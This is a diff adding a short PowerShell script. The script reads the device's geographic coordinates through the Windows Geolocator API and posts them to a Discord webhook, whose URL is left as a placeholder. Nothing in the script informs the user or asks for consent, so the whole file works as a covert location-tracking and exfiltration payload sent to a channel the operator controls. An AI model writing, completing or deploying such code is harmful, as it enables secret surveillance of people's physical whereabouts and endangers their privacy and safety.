@@ -1,0 +1,27 @@
+
+function Get-UserLocation {
+    $geolocator = New-Object Windows.Devices.Geolocation.Geolocator
+    $geoposition = $geolocator.GetGeopositionAsync().GetResults()
+    $coordinate = $geoposition.Coordinate
+    return $coordinate
+}
+
+
+function Send-LocationToDiscord {
+    param (
+        [Windows.Devices.Geolocation.Geocoordinate]$Coordinate
+    )
+
+    $webhookUrl = "Discord token aqui"
+    $payload = @{
+        content = "Latitude: $($Coordinate.Latitude), Longitude: $($Coordinate.Longitude)"
+    }
+
+    Invoke-RestMethod -Method Post -Uri $webhookUrl -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+}
+
+
+$userLocation = Get-UserLocation
+
+
+Send-LocationToDiscord -Coordinate $userLocation
